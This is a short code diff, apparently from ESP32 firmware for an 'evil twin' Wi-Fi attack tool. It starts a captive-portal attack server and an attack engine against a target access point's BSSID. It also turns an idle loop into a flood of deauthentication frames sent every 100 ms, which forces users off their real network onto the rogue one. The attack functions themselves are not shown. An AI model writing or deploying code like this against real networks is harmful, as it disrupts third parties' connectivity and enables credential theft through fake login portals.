@@ -1,9 +1,12 @@
 #include <string.h>
 #include "esp_log.h"
+#include "esp_task_wdt.h"
 #include "wifiMng.h"
 #include "admin_server.h"
 #include "server.h"
 #include "evil_twin.h"
+#include "wifi_attacks.h"
+
 
 /* Store target information */
 static const char *TAG = "EVIL_TWIN:";
@@ -52,10 +55,13 @@ static void evil_twin_task(void *pvParameters)
     /* Start captive portal server */
     http_attack_server_start();
 
-    /* Send deauths */
+    /* Start wifi attack engine */
+    wifi_attack_engine_start(target.bssid);
+
     while(true)
     {
-        vTaskDelay(pdMS_TO_TICKS(5000));
+        wifi_attack_deauth(target.bssid);
+        vTaskDelay(pdMS_TO_TICKS(100));
     }
 }
 
